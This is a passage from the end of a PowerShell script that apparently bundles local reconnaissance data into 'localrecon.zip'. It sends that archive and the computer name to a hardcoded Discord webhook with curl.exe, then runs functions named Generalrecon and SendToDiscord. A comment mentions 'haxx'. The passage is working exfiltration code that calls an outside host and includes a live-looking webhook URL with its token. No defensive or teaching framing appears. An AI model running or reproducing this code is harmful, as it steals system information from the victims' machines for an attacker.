        ErrorAction = 'Stop'
        ContentType = "multipart/form-data"
        Method      = 'Post'
    }
    
    try {
        Invoke-RestMethod @invokeRestMethodSplat
    }
    catch {
        Write-Error $_
    }
#>

$WEBHOOK_URL = "https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn973JOB-KaOnbZflSboYGAgTAqUWUn8Y4fWnvV8ulDIe1zJ7"
curl.exe -H "Content-Type: application/json" -d '{\"username\": \"test\", \"content\": \"$($env:computername)\"}' $WEBHOOK_URL
curl.exe -H "Content-Type: multipart/form-data" -F "file1=@localrecon.zip" $WEBHOOK_URL
#$Body=@{ content = "$env:computername Stats from Mindphasr haxx"};Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn973JOB-KaOnbZflSboYGAgTAqUWUn8Y4fWnvV8ulDIe1zJ7" -Method Post -Body ($Body | ConvertTo-Json);curl.exe -H "accept: application/json" -H  "Content-Type: multipart/form-data" -F "$global:currentPath\LocalRecon.zip"

}    

try {
    pathcheck
    Generalrecon
    SendToDiscord
}
catch {
    Write-Error $_
}
